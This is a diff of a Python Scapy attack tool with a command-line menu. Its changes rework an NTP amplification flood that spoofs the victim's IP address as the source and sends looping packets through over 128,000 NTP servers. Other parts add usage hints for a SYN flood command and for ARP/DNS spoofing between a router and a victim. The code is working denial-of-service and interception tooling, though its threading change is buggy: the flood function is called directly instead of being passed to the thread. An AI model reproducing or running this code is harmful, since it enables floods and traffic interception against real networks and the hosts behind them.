@@ -60,7 +60,14 @@ import signal
 
 
 clientsList = [ ]
+
 global myip
+
+#ntp stuff
+ntplist = [ ]
+global currentserver
+global data
+
 
 yes = set(['yes','y', 'ye', 'Y','YE','YES','yea', 'yeah', 'oui', ''])
 no = set(['no','n', 'No', 'NO', 'non', 'nah'])
@@ -98,15 +105,11 @@ def yesorno(choice):
 
 
 #packet sender
-def deny():
+def deny(ntplist, currentserver, targetIP, data):
     #Import globals to function
-    global ntplist
-    global currentserver
-    global data
-    global target
     ntpserver = ntplist[currentserver] #Get new server
     currentserver = currentserver + 1 #Increment for next 
-    packet = IP(dst=ntpserver,src=target)/UDP(sport=48947,dport=123)/Raw(load=data) #BUILD IT
+    packet = IP(dst=ntpserver,src=targetIP)/UDP(sport=48947,dport=123)/Raw(load=data) #BUILD IT
     send(packet,loop=1) #SEND IT
 
 
@@ -119,7 +122,9 @@ def amplify(targetIP):
     #128437 ntp servers in txt file
     numOfServers = 128437
 
-    
+    numberthreads = numOfServers
+   
+ 
 
     #System for accepting bulk input
     ntplist = []
@@ -138,12 +143,12 @@ def amplify(targetIP):
 
     #Hold our threads
     threads = []
-    print "Starting to flood: "+ target + " using ntp-servers.txt  With " + str(numberthreads) + " threads"
+    print "Starting to flood: "+ targetIP + " using ntp-servers.txt  With " + str(numberthreads) + " threads"
     print "Use CTRL+C to stop attack"
 
     #Thread spawner
     for n in range(numberthreads):
-	thread = threading.Thread(target=deny)
+	thread = threading.Thread(target=deny(ntplist, currentserver, targetIP, data))
 	thread.daemon = True
 	thread.start()
 
@@ -248,7 +253,6 @@ class sendSYN(threading.Thread):
 
                 send(i/t, verbose=0)
 
- 
 class CLI(cmd.Cmd):
 
     def __init__(self):
@@ -328,6 +332,7 @@ class CLI(cmd.Cmd):
 	    Pings IP address"""
 	if not(arg):
 	    print "No ip entered"
+	    print "ping [host IP address] [count] \n"
 	else:
 	    print "\nPinging... ",arg,"\n"
 	    pingIP = str(IPAddress(arg))
@@ -404,6 +409,7 @@ class CLI(cmd.Cmd):
     
 	if len(arplist) < 4:
 	    print "\n Error, not enough args \n"
+	    print "dns [routerIP] [victimIP] [routerMAC] [victimMAC]\n"
 	else:
 	    print"Enabling IP forwarding...\n"
 
@@ -472,6 +478,7 @@ class CLI(cmd.Cmd):
 	    """
 	if not(arg):
 	    print "No ip entered"
+	    print "syn [target ip] [port]\n"
 	else:
 
 	    print "\n",arg,"\n"
@@ -486,6 +493,7 @@ class CLI(cmd.Cmd):
 		try:
 		    syner = sendSYN(targetip, port)
 		    syner.start()
+#		    amplify(targetip)
 		    total += 1
 		    sys.stdout.write("\rTotal packets sent:\t\t\t%i" % total)
 		except KeyboardInterrupt:
